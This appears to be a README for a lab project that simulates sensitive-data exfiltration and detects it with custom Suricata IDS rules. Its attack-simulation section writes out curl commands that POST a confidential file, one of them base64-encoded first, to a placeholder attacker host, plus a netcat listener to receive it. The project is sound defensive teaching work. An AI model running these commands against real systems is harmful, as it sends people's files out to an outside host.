# Sensitive Data Exfiltration Detection using Suricata IDS

## Overview

This project demonstrates simulation and detection of sensitive data exfiltration using Suricata IDS in a virtual lab environment.

The setup includes:
- Ubuntu as victim and detection machine
- Kali Linux as attacker machine
- Suricata IDS for outbound traffic monitoring
- Curl and Netcat for attack simulation

---

## Features

- HTTP POST exfiltration detection
- Sensitive keyword detection
- Base64 encoded payload detection
- Large outbound transfer detection
- Curl User-Agent detection
- Suspicious external host monitoring

---

## Technologies Used

- Suricata IDS
- Ubuntu Linux
- Kali Linux
- Netcat
- Curl
- Base64 Encoding

---

## Network Architecture

| Machine | Role |
|---|---|
| Ubuntu | Victim + Detection |
| Kali Linux | Attacker |

---

## Installation

### Install Suricata

```bash
sudo apt update
sudo apt install suricata -y
```

### Clone Repository

```bash
git clone https://github.com/your-username/sensitive-data-exfiltration-detection.git
cd sensitive-data-exfiltration-detection
```

---

## Configure Rules

Copy rules:

```bash
sudo cp rules/local.rules /etc/suricata/rules/local.rules
```

Test configuration:

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml
```

---

## Run Suricata

```bash
sudo suricata -i ens33 -S /etc/suricata/rules/local.rules
```

Replace `ens33` with your network interface.

---

## Attack Simulations

### Start Attacker Listener

```bash
nc -lvnp 8080
```

### HTTP POST Exfiltration

```bash
curl -X POST --data-binary "@/home/user/sensitive/confidential.txt" http://<attacker-ip>:8080
```

### Base64 Encoded Exfiltration

```bash
base64 ~/sensitive/confidential.txt | curl -X POST -d @- http://<attacker-ip>:8080
```

### Large File Transfer

```bash
dd if=/dev/zero of=~/sensitive/largefile.txt bs=1024 count=10
curl -X POST --data-binary "@/home/user/sensitive/largefile.txt" http://<attacker-ip>:8080
```

---

## Detection Rules

| SID | Description |
|---|---|
| 1000001 | Sensitive Data Exfiltration |
| 1000002 | HTTP POST Detection |
| 1000003 | Sensitive Keyword Detection |
| 1000004 | Base64 Exfiltration Detection |
| 1000005 | Large Outbound Transfer |
| 1000006 | Curl User-Agent Detection |
| 1000007 | Suspicious External Host |

---

## Logs

View alerts:

```bash
sudo tail -f /var/log/suricata/fast.log
```

Detailed logs:

```bash
sudo tail -f /var/log/suricata/eve.json
```

---

## Screenshots

Screenshots are available in the `screenshots/` directory.

---

## Conclusion

This project demonstrates how Suricata IDS can detect multiple outbound exfiltration techniques using custom IDS signatures and network traffic analysis.

---

## License

MIT License
